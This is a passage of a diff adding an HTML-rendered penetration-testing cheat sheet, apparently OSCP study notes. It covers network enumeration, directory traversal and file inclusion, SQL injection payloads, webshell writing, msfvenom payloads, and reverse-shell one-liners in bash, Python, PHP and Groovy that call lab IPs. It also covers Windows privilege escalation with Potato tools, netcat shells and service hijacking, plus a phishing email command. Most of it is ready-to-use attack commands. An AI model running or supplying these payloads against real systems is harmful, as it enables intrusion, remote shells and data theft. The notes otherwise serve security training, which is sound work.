+<span class="k">for </span>ip <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>200 254<span class="si">)</span><span class="p">;</span> <span class="k">do </span>host 51.222.169.<span class="nv">$ip</span><span class="p">;</span> <span class="k">done</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"not found"</span> <span class="c">#bash bruteforcer to find domain name</span>
+
+<span class="c">## DNS Recon</span>
+dnsrecon <span class="nt">-d</span> megacorpone.com <span class="nt">-t</span> std <span class="c">#standard recon</span>
+dnsrecon <span class="nt">-d</span> megacorpone.com <span class="nt">-D</span> ~/list.txt <span class="nt">-t</span> brt <span class="c">#bruteforce, hence we provided list</span>
+
+<span class="c"># DNS Bruteforce using dnsenum</span>
+dnsenum megacorpone.com
+
+<span class="c">## NSlookup, a gold mine</span>
+nslookup mail.megacorptwo.com
+nslookup <span class="nt">-type</span><span class="o">=</span>TXT info.megacorptwo.com 192.168.50.151 <span class="c">#We are querying the information from a specific IP, here it is 192.168.50.151. This can be very useful</span>
+</code></pre></div></div> <h2 id="smtp-enumeration">SMTP enumeration</h2> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nv</span> &lt;IP&gt; 25 <span class="c">#Version Detection</span>
+smtp-user-enum <span class="nt">-M</span> VRFY <span class="nt">-U</span> username.txt <span class="nt">-t</span> &lt;IP&gt; <span class="c"># -M means mode; it can be RCPT, VRFY, EXPN</span>
+
+<span class="c">#Sending email with valid credentials, the below is an example of Phishing mail attack</span>
+<span class="nb">sudo </span>swaks <span class="nt">-t</span> daniela@beyond.com <span class="nt">-t</span> marcus@beyond.com <span class="nt">--from</span> john@beyond.com <span class="nt">--attach</span> @config.Library-ms <span class="nt">--server</span> 192.168.50.242 <span class="nt">--body</span> @body.txt <span class="nt">--header</span> <span class="s2">"Subject: Staging Script"</span> <span class="nt">--suppress-data</span> <span class="nt">-ap</span>
+</code></pre></div></div> <h2 id="ldap-enumeration">LDAP Enumeration</h2> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://&lt;IP&gt;:&lt;port&gt; <span class="c"># try on both ldap and ldaps, this is first command to run if you dont have any valid credentials.</span>
+
+ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://&lt;IP&gt; <span class="nt">-D</span> <span class="s1">''</span> <span class="nt">-w</span> <span class="s1">''</span> <span class="nt">-b</span> <span class="s2">"DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"</span>
+ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://&lt;IP&gt; <span class="nt">-D</span> <span class="s1">'&lt;DOMAIN&gt;\&lt;username&gt;'</span> <span class="nt">-w</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">-b</span> <span class="s2">"DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"</span>
+<span class="c">#CN name describes the info we're collecting</span>
+ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://&lt;IP&gt; <span class="nt">-D</span> <span class="s1">'&lt;DOMAIN&gt;\&lt;username&gt;'</span> <span class="nt">-w</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">-b</span> <span class="s2">"CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"</span>
+ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://&lt;IP&gt; <span class="nt">-D</span> <span class="s1">'&lt;DOMAIN&gt;\&lt;username&gt;'</span> <span class="nt">-w</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">-b</span> <span class="s2">"CN=Computers,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"</span>
+ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://&lt;IP&gt; <span class="nt">-D</span> <span class="s1">'&lt;DOMAIN&gt;\&lt;username&gt;'</span> <span class="nt">-w</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">-b</span> <span class="s2">"CN=Domain Admins,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"</span>
+ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://&lt;IP&gt; <span class="nt">-D</span> <span class="s1">'&lt;DOMAIN&gt;\&lt;username&gt;'</span> <span class="nt">-w</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">-b</span> <span class="s2">"CN=Domain Users,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"</span>
+ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://&lt;IP&gt; <span class="nt">-D</span> <span class="s1">'&lt;DOMAIN&gt;\&lt;username&gt;'</span> <span class="nt">-w</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">-b</span> <span class="s2">"CN=Enterprise Admins,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"</span>
+ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://&lt;IP&gt; <span class="nt">-D</span> <span class="s1">'&lt;DOMAIN&gt;\&lt;username&gt;'</span> <span class="nt">-w</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">-b</span> <span class="s2">"CN=Administrators,CN=Builtin,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"</span>
+ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://&lt;IP&gt; <span class="nt">-D</span> <span class="s1">'&lt;DOMAIN&gt;\&lt;username&gt;'</span> <span class="nt">-w</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">-b</span> <span class="s2">"CN=Remote Desktop Users,CN=Builtin,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"</span>
+
+<span class="c">#windapsearch.py</span>
+<span class="c">#for computers</span>
+python3 windapsearch.py <span class="nt">--dc-ip</span> &lt;IP address&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">--computers</span>
+
+<span class="c">#for groups</span>
+python3 windapsearch.py <span class="nt">--dc-ip</span> &lt;IP address&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">--groups</span>
+
+<span class="c">#for users</span>
+python3 windapsearch.py <span class="nt">--dc-ip</span> &lt;IP address&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">--da</span>
+
+<span class="c">#for privileged users</span>
+python3 windapsearch.py <span class="nt">--dc-ip</span> &lt;IP address&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">--privileged-users</span>
+</code></pre></div></div> <h2 id="nfs-enumeration">NFS Enumeration</h2> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sV</span> <span class="nt">--script</span><span class="o">=</span>nfs-showmount &lt;IP&gt;
+showmount <span class="nt">-e</span> &lt;IP&gt;
+</code></pre></div></div> <h2 id="snmp-enumeration">SNMP Enumeration</h2> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Nmap UDP scan</span>
+<span class="nb">sudo </span>nmap &lt;IP&gt; <span class="nt">-A</span> <span class="nt">-T4</span> <span class="nt">-p-</span> <span class="nt">-sU</span> <span class="nt">-v</span> <span class="nt">-oN</span> nmap-udpscan.txt
+
+snmpcheck <span class="nt">-t</span> &lt;IP&gt; <span class="nt">-c</span> public <span class="c">#Better version than snmpwalk as it displays more user friendly</span>
+
+snmpwalk <span class="nt">-c</span> public <span class="nt">-v1</span> <span class="nt">-t</span> 10 &lt;IP&gt; <span class="c">#Displays entire MIB tree, MIB Means Management Information Base</span>
+snmpwalk <span class="nt">-c</span> public <span class="nt">-v1</span> &lt;IP&gt; 1.3.6.1.4.1.77.1.2.25 <span class="c">#Windows User enumeration</span>
+snmpwalk <span class="nt">-c</span> public <span class="nt">-v1</span> &lt;IP&gt; 1.3.6.1.2.1.25.4.2.1.2 <span class="c">#Windows Processes enumeration</span>
+snmpwalk <span class="nt">-c</span> public <span class="nt">-v1</span> &lt;IP&gt; 1.3.6.1.2.1.25.6.3.1.2 <span class="c">#Installed software enumeraion</span>
+snmpwalk <span class="nt">-c</span> public <span class="nt">-v1</span> &lt;IP&gt; 1.3.6.1.2.1.6.13.1.3 <span class="c">#Opened TCP Ports</span>
+
+<span class="c">#Windows MIB values</span>
+1.3.6.1.2.1.25.1.6.0 - System Processes
+1.3.6.1.2.1.25.4.2.1.2 - Running Programs
+1.3.6.1.2.1.25.4.2.1.4 - Processes Path
+1.3.6.1.2.1.25.2.3.1.4 - Storage Units
+1.3.6.1.2.1.25.6.3.1.2 - Software Name
+1.3.6.1.4.1.77.1.2.25 - User Accounts
+1.3.6.1.2.1.6.13.1.3 - TCP Local Ports
+</code></pre></div></div> <h2 id="rpc-enumeration">RPC Enumeration</h2> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span><span class="o">=</span>user <span class="nv">$IP</span>
+rpcclient <span class="nt">-U</span><span class="o">=</span><span class="s2">""</span> <span class="nv">$IP</span> <span class="c">#Anonymous login</span>
+<span class="c">##Commands within in RPCclient</span>
+srvinfo
+enumdomusers <span class="c">#users</span>
+enumpriv <span class="c">#like "whoami /priv"</span>
+queryuser &lt;user&gt; <span class="c">#detailed user info</span>
+getuserdompwinfo &lt;RID&gt; <span class="c">#password policy, get user-RID from previous command</span>
+lookupnames &lt;user&gt; <span class="c">#SID of specified user</span>
+createdomuser &lt;username&gt; <span class="c">#Creating a user</span>
+deletedomuser &lt;username&gt;
+enumdomains
+enumdomgroups
+querygroup &lt;group-RID&gt; <span class="c">#get rid from previous command</span>
+querydispinfo <span class="c">#description of all users</span>
+netshareenum <span class="c">#Share enumeration, this only comesup if the current user we're logged in has permissions</span>
+netshareenumall
+lsaenumsid <span class="c">#SID of all users</span>
+</code></pre></div></div> <hr/> <h1 id="web-attacks">Web Attacks</h1> <aside> 💡 Cross-platform PHP revershell: [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php) </aside> <h2 id="directory-traversal">Directory Traversal</h2> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/passwd <span class="c">#displaying content through absolute path</span>
+<span class="nb">cat</span> ../../../etc/passwd <span class="c">#relative path</span>
+
+<span class="c"># if the pwd is /var/log/ then in order to view the /etc/passwd it will be like this</span>
+<span class="nb">cat</span> ../../etc/passwd
+
+<span class="c">#In web int should be exploited like this, find a parameters and test it out</span>
+http://mountaindesserts.com/meteor/index.php?page<span class="o">=</span>../../../../../../../../../etc/passwd
+<span class="c">#check for id_rsa, id_ecdsa</span>
+<span class="c">#If the output is not getting formatted properly then,</span>
+curl http://mountaindesserts.com/meteor/index.php?page<span class="o">=</span>../../../../../../../../../etc/passwd
+
+<span class="c">#For windows</span>
+http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt <span class="c">#no need to provide drive</span>
+</code></pre></div></div> <ul> <li>URL Encoding</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Sometimes it doesn't show if we try path, then we need to encode them</span>
+curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+</code></pre></div></div> <ul> <li>Wordpress <ul> <li>Simple exploit: https://github.com/leonjza/wordpress-shell</li> </ul> </li> </ul> <h2 id="local-file-inclusion">Local File Inclusion</h2> <ul> <li>The main difference between Directory traversal and this attack is that we can execute commands remotely here.</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#At first we need</span>
+http://192.168.45.125/index.php?page<span class="o">=</span>../../../../../../../../../var/log/apache2/access.log&amp;cmd<span class="o">=</span><span class="nb">whoami</span> <span class="c">#we're passing a command here</span>
+
+<span class="c">#Reverse shells</span>
+bash <span class="nt">-c</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/192.168.119.3/4444 0&gt;&amp;1"</span>
+<span class="c">#We can simply pass a reverse shell to the cmd parameter and obtain reverse-shell</span>
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22 <span class="c">#encoded version of above reverse-shell</span>
+
+<span class="c">#PHP wrapper</span>
+curl <span class="s2">"http://mountaindesserts.com/meteor/index.php?page=data://text/plain,&lt;?php%20echo%20system('uname%20-a');?&gt;"</span>
+curl http://mountaindesserts.com/meteor/index.php?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>/var/www/html/backup.php
+</code></pre></div></div> <ul> <li>Remote file inclusion</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. Obtain a php shell
+2. host a file server
+3.
+http://mountaindesserts.com/meteor/index.php?page<span class="o">=</span>http://attacker-ip/simple-backdoor.php&amp;cmd<span class="o">=</span><span class="nb">ls
+</span>we can also host a php reverseshell and obtain shell.
+</code></pre></div></div> <h2 id="sql-injection">SQL Injection</h2> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin<span class="s1">' or '</span>1<span class="s1">'='</span>1
+<span class="s1">' or '</span>1<span class="s1">'='</span>1
+<span class="s2">" or "</span>1<span class="s2">"="</span>1
+<span class="s2">" or "</span>1<span class="s2">"="</span>1<span class="s2">"--
+"</span> or <span class="s2">"1"</span><span class="o">=</span><span class="s2">"1"</span>/<span class="k">*</span>
+<span class="s2">" or "</span>1<span class="s2">"="</span>1<span class="s2">"#
+"</span> or <span class="nv">1</span><span class="o">=</span>1
+<span class="s2">" or 1=1 --
+"</span> or <span class="nv">1</span><span class="o">=</span>1 -
+<span class="s2">" or 1=1--
+"</span> or <span class="nv">1</span><span class="o">=</span>1/<span class="k">*</span>
+<span class="s2">" or 1=1#
+"</span> or <span class="nv">1</span><span class="o">=</span>1-
+<span class="s2">") or "</span>1<span class="s2">"="</span>1
+<span class="s2">") or "</span>1<span class="s2">"="</span>1<span class="s2">"--
+"</span><span class="o">)</span> or <span class="s2">"1"</span><span class="o">=</span><span class="s2">"1"</span>/<span class="k">*</span>
+<span class="s2">") or "</span>1<span class="s2">"="</span>1<span class="s2">"#
+"</span><span class="o">)</span> or <span class="o">(</span><span class="s2">"1"</span><span class="o">=</span><span class="s2">"1
+"</span><span class="o">)</span> or <span class="o">(</span><span class="s2">"1"</span><span class="o">=</span><span class="s2">"1"</span><span class="nt">--</span>
+<span class="s2">") or ("</span>1<span class="s2">"="</span>1<span class="s2">"/*
+"</span><span class="o">)</span> or <span class="o">(</span><span class="s2">"1"</span><span class="o">=</span><span class="s2">"1"</span><span class="c">#</span>
+<span class="o">)</span> or <span class="s1">'1`='</span>1-
+</code></pre></div></div> <ul> <li>Blind SQL Injection - This can be identified by Time-based SQLI</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Application takes some time to reload, here it is 3 seconds</span>
+http://192.168.50.16/blindsqli.php?user<span class="o">=</span>offsec<span class="s1">' AND IF (1=1, sleep(3),'</span><span class="nb">false</span><span class="s1">') -- //
+</span></code></pre></div></div> <ul> <li>Manual Code Execution</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali&gt; impacket-mssqlclient Administrator:Lab123@192.168.50.18 <span class="nt">-windows-auth</span> <span class="c">#To login</span>
+EXECUTE sp_configure <span class="s1">'show advanced options'</span>, 1<span class="p">;</span>
+RECONFIGURE<span class="p">;</span>
+EXECUTE sp_configure <span class="s1">'xp_cmdshell'</span>, 1<span class="p">;</span>
+RECONFIGURE<span class="p">;</span>
+<span class="c">#Now we can run commands</span>
+EXECUTE xp_cmdshell <span class="s1">'whoami'</span><span class="p">;</span>
+
+<span class="c">#Sometimes we may not have direct access to convert it to RCE from the web, then follow the below steps</span>
+<span class="s1">' UNION SELECT "&lt;?php system($_GET['</span>cmd<span class="s1">']);?&gt;", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // #Writing into a new file
+#Now we can exploit it
+http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
+</span></code></pre></div></div> <ul> <li>SQLMap - Automated Code Execution</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> http://192.168.50.19/blindsqli.php?user<span class="o">=</span>1 <span class="nt">-p</span> user <span class="c">#Testing on parameter names "user", we'll get confirmation</span>
+sqlmap <span class="nt">-u</span> http://192.168.50.19/blindsqli.php?user<span class="o">=</span>1 <span class="nt">-p</span> user <span class="nt">--dump</span> <span class="c">#Dumping database</span>
+
+<span class="c">#OS Shell</span>
+<span class="c">#  Obtain the Post request from Burp suite and save it to post.txt</span>
+sqlmap <span class="nt">-r</span> post.txt <span class="nt">-p</span> item  <span class="nt">--os-shell</span>  <span class="nt">--web-root</span> <span class="s2">"/var/www/html/tmp"</span> <span class="c">#/var/www/html/tmp is the writable folder on target, hence we're writing there</span>
+
+</code></pre></div></div> <hr/> <h1 id="exploitation">Exploitation</h1> <h2 id="finding-exploits">Finding Exploits</h2> <p><br/></p> <h3 id="searchsploit">Searchsploit</h3> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit &lt;name&gt;
+searchsploit <span class="nt">-m</span> windows/remote/46697.py <span class="c">#Copies the exploit to the current location</span>
+</code></pre></div></div> <h2 id="reverse-shells">Reverse Shells</h2> <p><br/></p> <h3 id="msfvenom">Msfvenom</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> exe <span class="o">&gt;</span> shell-x86.exe
+msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> exe <span class="o">&gt;</span> shell-x64.exe
+
+msfvenom <span class="nt">-p</span> windows/shell/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> asp <span class="o">&gt;</span> shell.asp
+msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> raw <span class="o">&gt;</span> shell.jsp
+msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> war <span class="o">&gt;</span> shell.war
+msfvenom <span class="nt">-p</span> php/reverse_php <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> raw <span class="o">&gt;</span> shell.php
+</code></pre></div></div> <p><br/></p> <h3 id="one-liners">One Liners</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;1
+python <span class="nt">-c</span> <span class="s1">'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'</span>
+&lt;?php <span class="nb">echo </span>shell_exec<span class="o">(</span><span class="s1">'bash -i &gt;&amp; /dev/tcp/10.11.0.106/443 0&gt;&amp;1'</span><span class="o">)</span><span class="p">;</span>?&gt;
+<span class="c">#For powershell use the encrypted tool that's in Tools folder</span>
+</code></pre></div></div> <aside> 💡 While dealing with PHP reverse shell use: [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php) </aside> <p><br/></p> <h3 id="groovy-reverse-shell">Groovy reverse-shell</h3> <ul> <li>For Jenkins</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>String <span class="nv">host</span><span class="o">=</span><span class="s2">"localhost"</span><span class="p">;</span>
+int <span class="nv">port</span><span class="o">=</span>8044<span class="p">;</span>
+String <span class="nv">cmd</span><span class="o">=</span><span class="s2">"cmd.exe"</span><span class="p">;</span>
+Process <span class="nv">p</span><span class="o">=</span>new ProcessBuilder<span class="o">(</span>cmd<span class="o">)</span>.redirectErrorStream<span class="o">(</span><span class="nb">true</span><span class="o">)</span>.start<span class="o">()</span><span class="p">;</span>Socket <span class="nv">s</span><span class="o">=</span>new Socket<span class="o">(</span>host,port<span class="o">)</span><span class="p">;</span>InputStream <span class="nv">pi</span><span class="o">=</span>p.getInputStream<span class="o">()</span>,pe<span class="o">=</span>p.getErrorStream<span class="o">()</span>, <span class="nv">si</span><span class="o">=</span>s.getInputStream<span class="o">()</span><span class="p">;</span>OutputStream <span class="nv">po</span><span class="o">=</span>p.getOutputStream<span class="o">()</span>,so<span class="o">=</span>s.getOutputStream<span class="o">()</span><span class="p">;</span><span class="k">while</span><span class="o">(!</span>s.isClosed<span class="o">()){</span><span class="k">while</span><span class="o">(</span>pi.available<span class="o">()&gt;</span>0<span class="o">)</span>so.write<span class="o">(</span>pi.read<span class="o">())</span><span class="p">;</span><span class="k">while</span><span class="o">(</span>pe.available<span class="o">()&gt;</span>0<span class="o">)</span>so.write<span class="o">(</span>pe.read<span class="o">())</span><span class="p">;</span><span class="k">while</span><span class="o">(</span>si.available<span class="o">()&gt;</span>0<span class="o">)</span>po.write<span class="o">(</span>si.read<span class="o">())</span><span class="p">;</span>so.flush<span class="o">()</span><span class="p">;</span>po.flush<span class="o">()</span><span class="p">;</span>Thread.sleep<span class="o">(</span>50<span class="o">)</span><span class="p">;</span>try <span class="o">{</span>p.exitValue<span class="o">()</span><span class="p">;</span><span class="nb">break</span><span class="p">;</span><span class="o">}</span>catch <span class="o">(</span>Exception e<span class="o">){}}</span><span class="p">;</span>p.destroy<span class="o">()</span><span class="p">;</span>s.close<span class="o">()</span><span class="p">;</span>
+</code></pre></div></div> <hr/> <h1 id="windows-privilege-escalation">Windows Privilege Escalation</h1> <aside> 💡 `cd C:\ &amp; findstr /SI /M "OS{" *.xml *.ini *.txt` - for finding files which contain OSCP flag.. </aside> <h2 id="manual-enumeration-commands">Manual Enumeration commands</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Groups we're part of</span>
+<span class="nb">whoami</span> /groups
+
+<span class="nb">whoami</span> /all <span class="c">#lists everything we own.</span>
+
+<span class="c">#Starting, Restarting and Stopping services in Powershell</span>
+Start-Service &lt;service&gt;
+Stop-Service &lt;service&gt;
+Restart-Service &lt;service&gt;
+
+<span class="c">#Powershell History</span>
+Get-History
+<span class="o">(</span>Get-PSReadlineOption<span class="o">)</span>.HistorySavePath <span class="c">#displays the path of consoleHost_history.txt</span>
+<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\s</span>athvik<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadline<span class="se">\C</span>onsoleHost_history.txt
+
+<span class="c">#Viewing installed execuatbles</span>
+Get-ItemProperty <span class="s2">"HKLM:</span><span class="se">\S</span><span class="s2">OFTWARE</span><span class="se">\W</span><span class="s2">ow6432Node</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\C</span><span class="s2">urrentVersion</span><span class="se">\U</span><span class="s2">ninstall</span><span class="se">\*</span><span class="s2">"</span> | <span class="k">select </span>displayname
+Get-ItemProperty <span class="s2">"HKLM:</span><span class="se">\S</span><span class="s2">OFTWARE</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\C</span><span class="s2">urrentVersion</span><span class="se">\U</span><span class="s2">ninstall</span><span class="se">\*</span><span class="s2">"</span> | <span class="k">select </span>displayname
+
+<span class="c">#Process Information</span>
+Get-Process
+Get-Process | Select ProcessName,Path
+
+<span class="c">#Sensitive info in XAMPP Directory</span>
+Get-ChildItem <span class="nt">-Path</span> C:<span class="se">\x</span>ampp <span class="nt">-Include</span> <span class="k">*</span>.txt,<span class="k">*</span>.ini <span class="nt">-File</span> <span class="nt">-Recurse</span> <span class="nt">-ErrorAction</span> SilentlyContinue
+Get-ChildItem <span class="nt">-Path</span> C:<span class="se">\U</span>sers<span class="se">\d</span>ave<span class="se">\ </span><span class="nt">-Include</span> <span class="k">*</span>.txt,<span class="k">*</span>.pdf,<span class="k">*</span>.xls,<span class="k">*</span>.xlsx,<span class="k">*</span>.doc,<span class="k">*</span>.docx <span class="nt">-File</span> <span class="nt">-Recurse</span> <span class="nt">-ErrorAction</span> SilentlyContinue <span class="c">#this for a specific user</span>
+
+<span class="c">#Service Information</span>
+Get-CimInstance <span class="nt">-ClassName</span> win32_service | Select Name,State,PathName | Where-Object <span class="o">{</span><span class="nv">$_</span>.State <span class="nt">-like</span> <span class="s1">'Running'</span><span class="o">}</span>
+</code></pre></div></div> <h2 id="automated-scripts">Automated Scripts</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winpeas.exe
+winpeas.bat
+Jaws-enum.ps1
+powerup.ps1
+PrivescCheck.ps1
+</code></pre></div></div> <h2 id="token-impersonation">Token Impersonation</h2> <ul> <li>Command to check <code class="language-plaintext highlighter-rouge">whoami /priv</code></li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Printspoofer</span>
+PrintSpoofer.exe <span class="nt">-i</span> <span class="nt">-c</span> powershell.exe
+PrintSpoofer.exe <span class="nt">-c</span> <span class="s2">"nc.exe &lt;lhost&gt; &lt;lport&gt; -e cmd"</span>
+
+<span class="c">#RoguePotato</span>
+RoguePotato.exe <span class="nt">-r</span> &lt;AttackerIP&gt; <span class="nt">-e</span> <span class="s2">"shell.exe"</span> <span class="nt">-l</span> 9999
+
+<span class="c">#GodPotato</span>
+GodPotato.exe <span class="nt">-cmd</span> <span class="s2">"cmd /c whoami"</span>
+GodPotato.exe <span class="nt">-cmd</span> <span class="s2">"shell.exe"</span>
+
+<span class="c">#JuicyPotatoNG</span>
+JuicyPotatoNG.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="s2">"shell.exe"</span> <span class="nt">-a</span>
+
+<span class="c">#SharpEfsPotato</span>
+SharpEfsPotato.exe <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\W</span>indowsPowerShell<span class="se">\v</span>1.0<span class="se">\p</span>owershell.exe <span class="nt">-a</span> <span class="s2">"whoami | Set-Content C:</span><span class="se">\t</span><span class="s2">emp</span><span class="se">\w</span><span class="s2">.log"</span>
+<span class="c">#writes whoami command to w.log file</span>
+</code></pre></div></div> <h2 id="services">Services</h2> <p><br/></p> <h3 id="binary-hijacking">Binary Hijacking</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Identify service from winpeas</span>
+icalcs <span class="s2">"path"</span> <span class="c">#F means full permission, we need to check we have full access on the folder</span>
+sc qc &lt;servicename&gt; <span class="c">#find binary path variable</span>
+sc config &lt;service&gt; &lt;option&gt;<span class="o">=</span><span class="s2">"&lt;value&gt;"</span> <span class="c">#change the path to the reverse shell location</span>
+sc start &lt;servicename&gt;
+</code></pre></div></div> <p><br/></p> <h3 id="unquoted-service-path">Unquoted Service Path</h3> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic service get name,pathname | findstr /i /v <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\\</span><span class="s2">"</span> | findstr /i /v <span class="s2">"""  #Displays services which has missing quotes, this can slo be obtained by running WinPEAS
+#Check the Writable path
+icalcs "</span>path<span class="s2">"
+#Insert the payload in writable location and which works.
+sc start &lt;servicename&gt;
+</span></code></pre></div></div> <p><br/></p> <h3 id="insecure-service-executables">Insecure Service Executables</h3> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#In Winpeas look for a service which has the following</span>
+File Permissions: Everyone <span class="o">[</span>AllAccess]
+<span class="c">#Replace the executable in the service folder and start the service</span>
+sc start &lt;service&gt;
+</code></pre></div></div> <p><br/></p> <h3 id="weak-registry-permissions">Weak Registry permissions</h3> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Look for the following in Winpeas services info output</span>
+HKLM<span class="se">\s</span>ystem<span class="se">\c</span>urrentcontrolset<span class="se">\s</span>ervices<span class="se">\&lt;</span>service&gt; <span class="o">(</span>Interactive <span class="o">[</span>FullControl]<span class="o">)</span> <span class="c">#This means we have full access</span>
+
+accesschk /acceptula <span class="nt">-uvwqk</span> &lt;path of registry&gt; <span class="c">#Check for KEY_ALL_ACCESS</span>
+
+<span class="c">#Service Information from regedit, identify the variable that holds the executable</span>
+reg query &lt;reg-path&gt;
+
